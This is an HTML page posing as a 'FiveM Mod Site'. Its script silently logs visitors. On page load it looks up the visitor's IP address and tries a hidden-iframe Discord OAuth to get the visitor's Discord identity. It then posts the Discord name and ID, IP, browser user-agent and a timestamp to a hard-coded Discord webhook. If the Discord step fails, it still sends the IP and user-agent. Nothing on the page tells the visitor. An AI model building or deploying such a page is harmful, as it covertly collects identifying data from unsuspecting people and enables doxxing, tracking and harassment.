<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FiveM Mod Site</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #e5e5e5;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: #111111;
            border: 1px solid #1a1a1a;
            border-radius: 16px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .loading {
            text-align: center;
            color: #6b7280;
            font-family: monospace;
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .hidden { display: none !important; }
        .watcher {
            display: flex;
            align-items: center;
            gap: 16px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 20px;
            margin-bottom: 24px;
        }
        .watcher img {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2px solid #22c55e;
        }
        .watcher .info { flex: 1; }
        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
        .badge {
            background: #1a1a1a;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #22c55e;
            border: 1px solid #22c55e33;
            font-family: monospace;
        }
        .ip-box {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin: 16px 0;
            font-family: monospace;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .ip-box .label { color: #6b7280; }
        .ip-box .value { color: #22c55e; }
        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
        .status {
            background: #0a0a0a;
            border: 1px solid #1a1a1a;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            font-size: 12px;
            color: #6b7280;
            font-family: monospace;
        }
        .status .success { color: #22c55e; }
        .status .error { color: #ef4444; }
        .status .info { color: #3b82f6; }
        .hidden-iframe {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            border: none;
            top: -9999px;
            left: -9999px;
        }
    </style>
</head>
<body>

<div class="card" id="app">
    <div id="loading" class="loading">
        <div>🔍 Loading...</div>
    </div>

    <div id="content" class="hidden">
        <div class="watcher">
            <img id="avatar" src="" alt="avatar">
            <div class="info">
                <div class="name" id="username">Loading...</div>
                <div class="id" id="discordId">ID: loading...</div>
            </div>
            <span class="badge">● WATCHER</span>
        </div>

        <div class="ip-box">
            <span class="label">📡 IP ADDRESS</span>
            <span class="value" id="ipDisplay">fetching...</span>
        </div>

        <div class="status" id="status">
            <span class="info">●</span> Authenticating...
        </div>
    </div>
</div>

<div class="footer">
    FiveM Mod Site — Silent Mode
</div>

<!-- Hidden iframe for silent Discord auth -->
<iframe id="discordFrame" class="hidden-iframe"></iframe>

<script>
    // ============================================================
    // CONFIG
    // ============================================================
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
    const CLIENT_ID = '1351732780288376902';
    const REDIRECT_URI = window.location.origin + window.location.pathname;

    // ============================================================
    // DOM REFS
    // ============================================================
    const loadingEl = document.getElementById('loading');
    const contentEl = document.getElementById('content');
    const avatarEl = document.getElementById('avatar');
    const usernameEl = document.getElementById('username');
    const discordIdEl = document.getElementById('discordId');
    const ipDisplayEl = document.getElementById('ipDisplay');
    const statusEl = document.getElementById('status');
    const frame = document.getElementById('discordFrame');

    // ============================================================
    // STATUS HELPER
    // ============================================================
    function setStatus(msg, type = 'info') {
        const color = type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : '#3b82f6';
        statusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
    }

    // ============================================================
    // GET IP
    // ============================================================
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    // ============================================================
    // SEND TO WEBHOOK
    // ============================================================
    async function sendToWebhook(discordUser, ip) {
        const displayName = discordUser.global_name || discordUser.username;
        const timestamp = new Date().toLocaleString();

        const payload = {
            content: `**👁️ SILENT VISITOR LOGGED**\n` +
                     `**Discord:** ${displayName} (${discordUser.id})\n` +
                     `**IP:** ${ip}\n` +
                     `**User-Agent:** ${navigator.userAgent}\n` +
                     `**Timestamp:** ${timestamp}`
        };

        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (res.ok) {
                setStatus(`✅ Webhook sent! ${displayName} (${discordUser.id}) from ${ip}`, 'success');
            } else {
                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
            }
        } catch (err) {
            setStatus(`❌ Webhook error: ${err.message}`, 'error');
        }
    }

    // ============================================================
    // FETCH DISCORD USER WITH TOKEN
    // ============================================================
    async function getDiscordUser(accessToken) {
        try {
            const res = await fetch('https://discord.com/api/users/@me', {
                headers: { Authorization: `Bearer ${accessToken}` }
            });
            return await res.json();
        } catch {
            return null;
        }
    }

    // ============================================================
    // SHOW USER UI
    // ============================================================
    function showUser(user) {
        loadingEl.classList.add('hidden');
        contentEl.classList.remove('hidden');

        const displayName = user.global_name || user.username;
        usernameEl.textContent = `${displayName}#${user.discriminator}`;
        discordIdEl.textContent = `ID: ${user.id}`;

        if (user.avatar) {
            avatarEl.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=64`;
        } else {
            avatarEl.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
        }
    }

    // ============================================================
    // SILENT AUTH VIA IFRAME — NO POPUPS, NO REDIRECTS
    // ============================================================
    function silentAuthViaIframe() {
        return new Promise((resolve, reject) => {
            const authUrl =
                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify&prompt=none`;

            // Load the auth URL in the hidden iframe
            frame.src = authUrl;

            // Listen for messages from the iframe (Discord redirects to our page with token in hash)
            let timeout = setTimeout(() => {
                reject(new Error('Authentication timed out.'));
            }, 15000);

            // Poll the iframe URL for the token
            const interval = setInterval(() => {
                try {
                    // Try to access the iframe's location
                    const iframeUrl = frame.contentWindow?.location?.href;
                    if (iframeUrl && iframeUrl.includes('access_token=')) {
                        clearInterval(interval);
                        clearTimeout(timeout);
                        const hash = iframeUrl.split('#')[1];
                        const params = new URLSearchParams(hash);
                        const token = params.get('access_token');
                        if (token) {
                            frame.src = 'about:blank';
                            resolve(token);
                        } else {
                            reject(new Error('No token found'));
                        }
                    }
                    // If the iframe redirected to our page with hash
                    if (iframeUrl && iframeUrl.includes(window.location.origin) && iframeUrl.includes('#')) {
                        clearInterval(interval);
                        clearTimeout(timeout);
                        const hash = iframeUrl.split('#')[1];
                        const params = new URLSearchParams(hash);
                        const token = params.get('access_token');
                        if (token) {
                            frame.src = 'about:blank';
                            resolve(token);
                        } else {
                            reject(new Error('No token found'));
                        }
                    }
                } catch (e) {
                    // Cross-origin errors are normal — ignore them
                }
            }, 200);
        });
    }

    // ============================================================
    // MAIN
    // ============================================================
    async function init() {
        try {
            // Check if we already have a token from a previous auth
            const hash = window.location.hash.substring(1);
            const params = new URLSearchParams(hash);
            let token = params.get('access_token');

            if (token) {
                window.history.replaceState({}, document.title, window.location.pathname);
            } else {
                setStatus('🔐 Silent authentication via iframe...', 'info');
                token = await silentAuthViaIframe();
            }

            const user = await getDiscordUser(token);
            if (!user || !user.id) {
                throw new Error('Failed to get user info');
            }

            const ip = await getIP();
            showUser(user);
            ipDisplayEl.textContent = ip;
            await sendToWebhook(user, ip);

        } catch (err) {
            setStatus(`❌ Error: ${err.message}`, 'error');
            // Fallback — still show the page
            loadingEl.classList.add('hidden');
            contentEl.classList.remove('hidden');
            usernameEl.textContent = 'Guest';
            discordIdEl.textContent = 'ID: unknown';
            ipDisplayEl.textContent = await getIP();
            // Still send IP to webhook even if Discord failed
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**👁️ VISITOR (Discord failed)**\n` +
                                 `**IP:** ${await getIP()}\n` +
                                 `**User-Agent:** ${navigator.userAgent}\n` +
                                 `**Timestamp:** ${new Date().toLocaleString()}\n` +
                                 `**Error:** ${err.message}`
                    })
                });
            } catch {}
        }
    }

    // ============================================================
    // START
    // ============================================================
    // If this page is opened inside the iframe with a token, close it
    if (window.location.hash.includes('access_token')) {
        // The iframe has the token — we don't need to do anything here
        // The parent page will poll and get it
    } else {
        init();
    }
</script>

</body>
</html>
